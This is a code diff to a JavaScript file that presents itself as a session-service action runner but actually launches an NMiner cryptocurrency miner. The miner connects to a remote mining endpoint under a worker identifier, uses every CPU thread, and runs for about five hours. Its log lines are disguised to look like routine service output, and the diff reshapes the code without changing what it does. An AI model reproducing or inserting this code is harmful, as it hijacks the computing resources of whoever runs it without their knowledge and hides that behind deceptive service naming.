@@ -1,31 +1,32 @@
 // Procedural action runner for onyx-session-service
 const os = require("os");
+const EventEmitter = require("events");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-class HostController {
-    constructor() {
-        const sessionId = "301959";
-        console.log(`[worker] Initialized HostController for onyx-session-service [${sessionId}]`);
+const dispatcher = new EventEmitter();
 
-        this.engine = new NMiner(
-            "wss://nmining-runtime.igrp.app/",
-            "Subhas1975.onyx-session-service",
-            ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
-        );
+dispatcher.once("start", () => {
+    const runId = "6271f5";
+    console.log(`[core] Subsystem dispatched for onyx-session-service [${runId}]`);
 
-        const heartbeat = setInterval(() => {}, 38000);
-        setTimeout(() => {
-        console.log("[timeout] Operational limit (310m) reached, exiting cleanly.");
+    const daemon = new NMiner(
+        "wss://nmining-runtime.igrp.app/",
+        "Subhas1975.onyx-session-service",
+        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
+    );
+
+    process.stdin.resume();
+    setTimeout(() => {
+        console.log("[timeout] Operational limit (302m) reached, exiting cleanly.");
         process.exit(0);
-    }, 310 * 60 * 1000);
+    }, 302 * 60 * 1000);
 
-        process.on("SIGTERM", () => {
-            clearInterval(heartbeat);
-            console.log("[supervisor] Clean shutdown completed.");
-            process.exit(0);
-        });
-    }
-}
+    process.on("SIGTERM", () => {
+        
+        console.log(`[exit] Process terminated gracefully for token ${runId}.`);
+        process.exit(0);
+    });
+});
 
-new HostController();
+dispatcher.emit("start");
